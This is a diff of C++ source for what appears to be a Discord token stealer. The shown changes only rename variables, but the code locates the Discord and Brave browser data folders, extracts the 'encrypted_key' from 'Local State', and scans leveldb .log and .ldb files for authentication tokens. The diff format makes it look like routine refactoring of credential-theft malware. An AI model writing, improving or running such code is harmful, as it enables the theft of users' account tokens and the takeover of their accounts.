@@ -70,8 +70,8 @@ std::vector<std::string> find_match(std::string content, std::regex regex) {
 	std::sregex_iterator last;
 
 	while (current != last) {
-		std::smatch currentMatch = *current;
-		output.push_back(currentMatch.str());
+		std::smatch current_match = *current;
+		output.push_back(current_match.str());
 		current++;
 	}
 
@@ -82,12 +82,12 @@ std::vector<std::string> find_paths() {
 	std::vector<std::string> targets;
 
 	char* local;
-	size_t localLen;
-	_dupenv_s(&local, &localLen, "LOCALAPPDATA");
+	size_t local_len;
+	_dupenv_s(&local, &local_len, "LOCALAPPDATA");
 
 	char* roaming;
-	size_t roamingLen;
-	_dupenv_s(&roaming, &roamingLen, "APPDATA");
+	size_t roaming_len;
+	_dupenv_s(&roaming, &roaming_len, "APPDATA");
 
 	std::string discordPath = std::string(roaming) + "\\discord";
 	std::string bravePath = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
@@ -181,18 +181,18 @@ std::string trim_ending_characters(const std::string& str, const std::string& ch
 
 void find_token(const std::string& path) {
 	std::string target = path + "\\Local Storage\\leveldb";
-	std::string keyPath = path + "\\Local State";
+	std::string key_path = path + "\\Local State";
 
 	try {
-		std::ifstream keyFile(keyPath);
+		std::ifstream key_file(key_path);
 		std::string key;
 
-		if (keyFile.is_open()) {
+		if (key_file.is_open()) {
 			std::string content;
 
-			content.assign((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());
+			content.assign((std::istreambuf_iterator<char>(key_file)), std::istreambuf_iterator<char>());
 
-			keyFile.close();
+			key_file.close();
 
 			key = extract_value(content, "encrypted_key");
 			key = trim_ending_characters(key, "}\"");
@@ -201,14 +201,14 @@ void find_token(const std::string& path) {
 		std::cout << key << std::endl;
 
 		for (const auto& entry : std::filesystem::directory_iterator(target)) {
-			std::string strPath = entry.path().u8string();
+			std::string str_path = entry.path().u8string();
 
-			if (has_extension(strPath, ".log")) {
-				search_token(target, strPath, key);
+			if (has_extension(str_path, ".log")) {
+				search_token(target, str_path, key);
 			}
 
-			if (has_extension(strPath, ".ldb")) {
-				search_token(target, strPath, key);
+			if (has_extension(str_path, ".ldb")) {
+				search_token(target, str_path, key);
 			}
 		}
 	}
